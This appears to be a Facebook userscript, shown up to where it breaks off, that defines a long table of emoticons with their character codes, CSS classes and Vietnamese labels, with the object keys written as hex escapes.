// ==UserScript==
// @name            Tool Vẽ ChiBi
// @description     All about facebook By Noname
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// ==ChiBi==
(function () {
    if (!document['querySelector']('#pageNav')) {
        return;
    };
    var _0x3384x1 = [{
        "\x63\x68\x61\x72\x73": ' :) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_smile',
        "\x6E\x61\x6D\x65": 'C\u01B0\u1EDDi t\u01B0\u01A1i'
    }, {
        "\x63\x68\x61\x72\x73": ' :( ',
        "\x63\x6C\x61\x73\x73": 'emoticon_frown',
        "\x6E\x61\x6D\x65": 'Bu\u1ED3n ch\xE1n'
    }, {
        "\x63\x68\x61\x72\x73": ' :P ',
        "\x63\x6C\x61\x73\x73": 'emoticon_tongue',
        "\x6E\x61\x6D\x65": 'L\xE8 l\u01B0\u1EE1i'
    }, {
        "\x63\x68\x61\x72\x73": ' :D ',
        "\x63\x6C\x61\x73\x73": 'emoticon_grin',
        "\x6E\x61\x6D\x65": 'C\u01B0\u1EDDi toe'
    }, {
        "\x63\x68\x61\x72\x73": ' :o ',
        "\x63\x6C\x61\x73\x73": 'emoticon_gasp',
        "\x6E\x61\x6D\x65": 'Ng\u1EA1c nhi\xEAn'
    }, {
        "\x63\x68\x61\x72\x73": ' ;) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_wink',
        "\x6E\x61\x6D\x65": 'Nh\xE1y m\u1EAFt'
    }, {
        "\x63\x68\x61\x72\x73": ' :v ',
        "\x63\x6C\x61\x73\x73": 'emoticon_pacman',
        "\x6E\x61\x6D\x65": 'C\u01B0\u1EDDi h\xE1 mi\u1EC7ng'
    }, {
        "\x63\x68\x61\x72\x73": ' >:( ',
        "\x63\x6C\x61\x73\x73": 'emoticon_grumpy',
        "\x6E\x61\x6D\x65": 'Nh\u0103n m\u1EB7t'
    }, {
        "\x63\x68\x61\x72\x73": ' :/ ',
        "\x63\x6C\x61\x73\x73": 'emoticon_unsure',
        "\x6E\x61\x6D\x65": 'M\u1EBFu'
    }, {
        "\x63\x68\x61\x72\x73": ' :\'( ',
        "\x63\x6C\x61\x73\x73": 'emoticon_cry',
        "\x6E\x61\x6D\x65": 'Kh\xF3c'
    }, {
        "\x63\x68\x61\x72\x73": ' ^_^ ',
        "\x63\x6C\x61\x73\x73": 'emoticon_kiki',
        "\x6E\x61\x6D\x65": 'C\u01B0\u1EDDi t\xEDt m\u1EAFt'
    }, {
        "\x63\x68\x61\x72\x73": ' 8) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_glasses',
        "\x6E\x61\x6D\x65": '\u0110eo k\xEDnh tr\u1EAFng'
    }, {
        "\x63\x68\x61\x72\x73": ' B| ',
        "\x63\x6C\x61\x73\x73": 'emoticon_sunglasses',
        "\x6E\x61\x6D\x65": '\u0110eo k\xEDnh \u0111en'
    }, {
        "\x63\x68\x61\x72\x73": ' <3 ',
        "\x63\x6C\x61\x73\x73": 'emoticon_heart',
        "\x6E\x61\x6D\x65": 'Tr\xE1i tim'
    }, {
        "\x63\x68\x61\x72\x73": ' 3:) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_devil',
        "\x6E\x61\x6D\x65": 'Qu\u1EF7 s\u1EE9'
    }, {
        "\x63\x68\x61\x72\x73": ' O:) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_angel',
        "\x6E\x61\x6D\x65": 'Thi\xEAn th\u1EA7n'
    }, {
        "\x63\x68\x61\x72\x73": ' -_- ',
        "\x63\x6C\x61\x73\x73": 'emoticon_squint',
        "\x6E\x61\x6D\x65": 'Nh\u1EAFm m\u1EAFt l\u1EA1i'
    }, {
        "\x63\x68\x61\x72\x73": ' o.O ',
        "\x63\x6C\x61\x73\x73": 'emoticon_confused',
        "\x6E\x61\x6D\x65": 'Tr\u1EE3n tr\xF2n m\u1EAFt'
    }, {
        "\x63\x68\x61\x72\x73": ' >:o ',
        "\x63\x6C\x61\x73\x73": 'emoticon_upset',
        "\x6E\x61\x6D\x65": 'Kh\xF3 ch\u1ECBu qu\xE1'
    }, {
        "\x63\x68\x61\x72\x73": ' :3 ',
        "\x63\x6C\x61\x73\x73": 'emoticon_colonthree',
        "\x6E\x61\x6D\x65": 'Kh\xF4ng quan t\xE2m'
    }, {
        "\x63\x68\x61\x72\x73": ' (y) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_like',
        "\x6E\x61\x6D\x65": 'Th\xEDch'
    }, {
        "\x63\x68\x61\x72\x73": ' :* ',
        "\x63\x6C\x61\x73\x73": 'emoticon emoticon_kiss',
        "\x6E\x61\x6D\x65": 'H\xF4n c\xE1i coi'
    }, {
        "\x63\x68\x61\x72\x73": ' (^^^) ',
        "\x63\x6C\x61\x73\x73": 'emoticon_shark',
        "\x6E\x61\x6D\x65": 'C\xE1 heo t\u1EE9c gi\u1EADn'
    }, {
        "\x63\x68\x61\x72\x73": ' :|] ',
        "\x63\x6C\x61\x73\x73": 'emoticon_robot',
        "\x6E\x61\x6D\x65": 'Robot'
    }, {
        "\x63\x68\x61\x72\x73": ' <(") ',
        "\x63\x6C\x61\x73\x73": 'emoticon_penguin',
        "\x6E\x61\x6D\x65": 'Chim c\xE1nh c\u1EE5t'
    }, {
        "\x63\x68\x61\x72\x73": ' :poop: ',
        "\x63\x6C\x61\x73\x73": 'emoticon_poop',
        "\x6E\x61\x6D\x65": '\u0102n shit nh\xE9'
    }, {
        "\x63\x68\x61\x72\x73": ' :putnam: ',
        "\x63\x6C\x61\x73\x73": 'emoticon_putnam',
        "\x6E\x61\x6D\x65": 'Th\u1EBF c\u01A1 \xE1?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF02 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c0',
        "\x6E\x61\x6D\x65": 'M\u01B0a r\u1ED3i, \xF4 n\xE8'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF0A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c1',
        "\x6E\x61\x6D\x65": 'S\xF3ng bi\u1EC3n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF19 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c2',
        "\x6E\x61\x6D\x65": 'V\u1EA7ng tr\u0103ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF1F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c3',
        "\x6E\x61\x6D\x65": 'Ng\xF4i sao'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF31 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c4',
        "\x6E\x61\x6D\x65": 'C\u1ECF'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF34 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c5',
        "\x6E\x61\x6D\x65": 'C\xE2y c\xF4 \u0111\u01A1n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF35 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c6',
        "\x6E\x61\x6D\x65": 'X\u01B0\u01A1ng r\u1ED3ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF37 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c7',
        "\x6E\x61\x6D\x65": 'Hoa Tulip'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF38 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c8',
        "\x6E\x61\x6D\x65": 'Hoa 5 c\xE1nh'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF39 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c9',
        "\x6E\x61\x6D\x65": 'Hoa h\u1ED3ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF3A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ca',
        "\x6E\x61\x6D\x65": 'C\xE2y hoa tr\xF2n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF3B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cb',
        "\x6E\x61\x6D\x65": 'Hoa h\u01B0\u1EDBng d\u01B0\u01A1ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF3E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cc',
        "\x6E\x61\x6D\x65": 'C\xE2y l\xFAa'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF40 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cd',
        "\x6E\x61\x6D\x65": 'Hoa 4 m\xF9a'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF41 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ce',
        "\x6E\x61\x6D\x65": 'L\xE1 phong'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF42 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cf',
        "\x6E\x61\x6D\x65": 'L\xE1 Fallen'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF43 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cg',
        "\x6E\x61\x6D\x65": 'L\xE1 xanh tr\u01B0\u1EDBc gi\xF3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF4A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ch',
        "\x6E\x61\x6D\x65": 'Qu\u1EA3 qu\xFDt'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF4E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ci',
        "\x6E\x61\x6D\x65": 'T\xE1o \u0111\u1ECF'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF53 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cj',
        "\x6E\x61\x6D\x65": 'D\xE2u t\xE2y, \u0103n \u0111i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF54 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ck',
        "\x6E\x61\x6D\x65": 'B\xE1nh m\u1EF3 ba t\xEA'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF78 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cl',
        "\x6E\x61\x6D\x65": 'N\u01B0\u1EDBc hoa qu\u1EA3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF7A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cm',
        "\x6E\x61\x6D\x65": 'Bia'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF81 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cn',
        "\x6E\x61\x6D\x65": 'H\u1ED9p qu\xE0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF83 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2co',
        "\x6E\x61\x6D\x65": 'Qu\u1EA3 b\xED ng\xF4'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF84 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cp',
        "\x6E\x61\x6D\x65": 'C\xE2y th\xF4ng Noel'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF85 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cq',
        "\x6E\x61\x6D\x65": '\xD4ng gi\xE0 Noel'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF88 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cr',
        "\x6E\x61\x6D\x65": 'B\xF3ng bay'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF89 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cs',
        "\x6E\x61\x6D\x65": 'K\xE8n cho Party'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF8D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ct',
        "\x6E\x61\x6D\x65": 'V\u01B0\u01A1ng mi\u1EC7ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF8E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cu',
        "\x6E\x61\x6D\x65": 'C\u1EB7p \u0111\xF4i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF8F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cv',
        "\x6E\x61\x6D\x65": '\u0110\xF4i c\xE1'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF90 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cw',
        "\x6E\x61\x6D\x65": 'K\u1EB9o gi\xF3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDF93 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cx',
        "\x6E\x61\x6D\x65": 'M\u0169 c\u1EED nh\xE2n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDFB5 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cy',
        "\x6E\x61\x6D\x65": 'B\u1EA3n nh\u1EA1c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDFB6 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2cz',
        "\x6E\x61\x6D\x65": 'N\u1ED1t nh\u1EA1c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83C\uDFBC ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c-',
        "\x6E\x61\x6D\x65": '\xC2m nh\u1EA1c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC0D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2c_',
        "\x6E\x61\x6D\x65": 'Con r\u1EAFn'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC0E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d0',
        "\x6E\x61\x6D\x65": 'Con ng\u1EF1a'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC11 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d1',
        "\x6E\x61\x6D\x65": 'Con d\xEA'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC12 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d2',
        "\x6E\x61\x6D\x65": 'Con khi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC14 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d3',
        "\x6E\x61\x6D\x65": 'Con g\xE0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC17 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d4',
        "\x6E\x61\x6D\x65": 'Con l\u1EE3n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC18 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d5',
        "\x6E\x61\x6D\x65": 'Con voi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC19 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d6',
        "\x6E\x61\x6D\x65": 'Con b\u1EA1ch tu\u1ED9c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC1A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d7',
        "\x6E\x61\x6D\x65": 'Con \u1ED1c'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC1B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d8',
        "\x6E\x61\x6D\x65": 'Con ch\u0103n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC1F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d9',
        "\x6E\x61\x6D\x65": 'Con c\xE1'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC20 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2da',
        "\x6E\x61\x6D\x65": 'C\xE1 c\u1EA3nh'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC21 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2db',
        "\x6E\x61\x6D\x65": 'C\xE1 mang ph\xECnh'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC25 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dc',
        "\x6E\x61\x6D\x65": 'G\xE0 con'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC26 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dd',
        "\x6E\x61\x6D\x65": 'Con chim'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC27 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2de',
        "\x6E\x61\x6D\x65": 'Chim c\xE1nh c\u1EE5t 2'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC28 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2df',
        "\x6E\x61\x6D\x65": 'G\u1EA5u'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC29 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dg',
        "\x6E\x61\x6D\x65": 'Ch\xF3 th\xE8 l\u01B0\u1EE1i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC2B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dh',
        "\x6E\x61\x6D\x65": 'Con l\u1EA1c \u0111\xE0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC2C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2di',
        "\x6E\x61\x6D\x65": 'Con c\xE1 voi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC2D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dj',
        "\x6E\x61\x6D\x65": 'M\u1EB7t chu\u1ED9t'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC2E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dk',
        "\x6E\x61\x6D\x65": 'M\u1EB7t b\xF2'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC2F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dl',
        "\x6E\x61\x6D\x65": 'M\u1EB7t m\xE8o'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC30 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dm',
        "\x6E\x61\x6D\x65": 'M\u1EB7t th\u1ECF'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC31 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dn',
        "\x6E\x61\x6D\x65": 'M\u1EB7t m\xE8o l\u01B0\u1EDDi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC33 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2do',
        "\x6E\x61\x6D\x65": 'C\xE1 voi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC34 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dp',
        "\x6E\x61\x6D\x65": 'M\u1EB7t ng\u1EF1a'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC35 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dq',
        "\x6E\x61\x6D\x65": 'M\u1EB7t kh\u1EC9'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC37 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dr',
        "\x6E\x61\x6D\x65": 'M\u1EB7t l\u1EE3n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC38 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ds',
        "\x6E\x61\x6D\x65": 'M\u1EB7t \u1EBFch'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC39 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dt',
        "\x6E\x61\x6D\x65": 'M\u1EB7t chu\u1ED9t Hamster'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC3A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2du',
        "\x6E\x61\x6D\x65": 'M\u1EB7t ch\xF3 s\xF3i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC3B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dv',
        "\x6E\x61\x6D\x65": 'M\u1EB7t g\u1EA5u'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC3E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dw',
        "\x6E\x61\x6D\x65": 'B\xE0n ch\xE2n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC40 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dx',
        "\x6E\x61\x6D\x65": 'Ng\xF3'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC42 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dy',
        "\x6E\x61\x6D\x65": 'H\xF3ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC43 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2dz',
        "\x6E\x61\x6D\x65": 'M\u0169i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC44 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d-',
        "\x6E\x61\x6D\x65": 'H\xF4n mi\u1EBFng n\xE0o'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC45 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2d_',
        "\x6E\x61\x6D\x65": 'Te t\u1EDFn'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC46 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e0',
        "\x6E\x61\x6D\x65": '\u0110\u1EE9a comment \u1EDF tr\xEAn r\u1EA5t g\xE0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC47 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e1',
        "\x6E\x61\x6D\x65": '\u0110\u1EE9a comment \u1EDF d\u01B0\u1EDBi r\u1EA5t g\xE0'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC48 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e2',
        "\x6E\x61\x6D\x65": 'B\xEAn tr\xE1i em \u01A1i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC49 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e3',
        "\x6E\x61\x6D\x65": 'B\xEAn ph\u1EA3i em \u01A1i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4A ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e4',
        "\x6E\x61\x6D\x65": 'N\xE0y th\xEC nh\xECn \u0111\u1EC3u'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e5',
        "\x6E\x61\x6D\x65": 'V\u1ED7 tay ngay & lu\xF4n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e6',
        "\x6E\x61\x6D\x65": 'OK, anh hi\u1EC3u r\u1ED3i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e7',
        "\x6E\x61\x6D\x65": '\u01AFng \xFD c\u1EE7a th\xEDm r\u1ED3i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e8',
        "\x6E\x61\x6D\x65": '\xDD th\xEDm nh\u01B0 ***'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC4F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2e9',
        "\x6E\x61\x6D\x65": '\u1EE6ng h\u1ED9 nhi\u1EC7t t\xECnh'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC50 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ea',
        "\x6E\x61\x6D\x65": 'C\xF2ng tay em l\u1EA1i \u0111i'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC66 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eb',
        "\x6E\x61\x6D\x65": 'HOT Boy'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC67 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ec',
        "\x6E\x61\x6D\x65": 'HOT Girl'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC68 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ed',
        "\x6E\x61\x6D\x65": 'X - Men'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC69 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ee',
        "\x6E\x61\x6D\x65": 'Ph\u1EE5 n\u1EEF'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC6B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ef',
        "\x6E\x61\x6D\x65": 'N\u1EAFm tay c\xE1i xem n\xE0o'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC6E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eg',
        "\x6E\x61\x6D\x65": 'Gi\u1EDD c\xE1c th\xEDm mu\u1ED1n g\xEC? C\u1EA3nh s\xE1t \u0111\xE2y'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC6F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eh',
        "\x6E\x61\x6D\x65": 'M\u1EDBi t\u1EADu c\xE1i tai th\u1ECF'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC71 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ei',
        "\x6E\x61\x6D\x65": '\u0110\u1EA7u m\u1EDBi'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC72 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ej',
        "\x6E\x61\x6D\x65": 'Nh\xECn c\u0169ng \u0111\u1EADp chai ph\u1EBFt'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC73 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ek',
        "\x6E\x61\x6D\x65": '\u0110\xE2y \u0111\u1EADp h\u01A1n nha c\u01B0ng'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC74 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2el',
        "\x6E\x61\x6D\x65": '\u1EEA, c\xF2n m\xECnh th\xEC gi\xE0 cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC75 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2em',
        "\x6E\x61\x6D\x65": 'Em c\u0169ng gi\xE0 cmnr'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC76 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2en',
        "\x6E\x61\x6D\x65": 'M\xECnh c\xF2n nh\u1ECF qu\xE1, ch\u1ECBu kh\xF3 FA v\u1EADy'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC77 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eo',
        "\x6E\x61\x6D\x65": '\u0110\u1ED9i m\u0169 \u0111i l\xE0m n\xE0o'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC78 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ep',
        "\x6E\x61\x6D\x65": 'C\xF4ng ch\xFAa'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC7B ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eq',
        "\x6E\x61\x6D\x65": 'Ma \u0111\xE2y, xo\u1EAFn ch\u01B0a?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC7C ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2er',
        "\x6E\x61\x6D\x65": 'Em l\xE0 thi\xEAn th\u1EA7n, nh\xECn em gi\u1ED1ng con \u0111\u1EA7n'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC7D ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2es',
        "\x6E\x61\x6D\x65": 'H\u1ED5 b\xE1o th\u1EBF n\xE0y \u0111\u01B0\u1EE3c ch\u01B0a?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC7E ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2et',
        "\x6E\x61\x6D\x65": 'H\u1ED5 b\xE1o t\u1EEB m\u1EABu gi\xE1o'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC7F ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2eu',
        "\x6E\x61\x6D\x65": '\u0110\u1EE7 c\u1EE9ng ch\u01B0a?'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC80 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ev',
        "\x6E\x61\x6D\x65": '\u0110\u1EA7u l\xE2u'
    }, {
        "\x63\x68\x61\x72\x73": ' \uD83D\uDC82 ',
        "\x63\x6C\x61\x73\x73": '_1az _1a- _2ew',
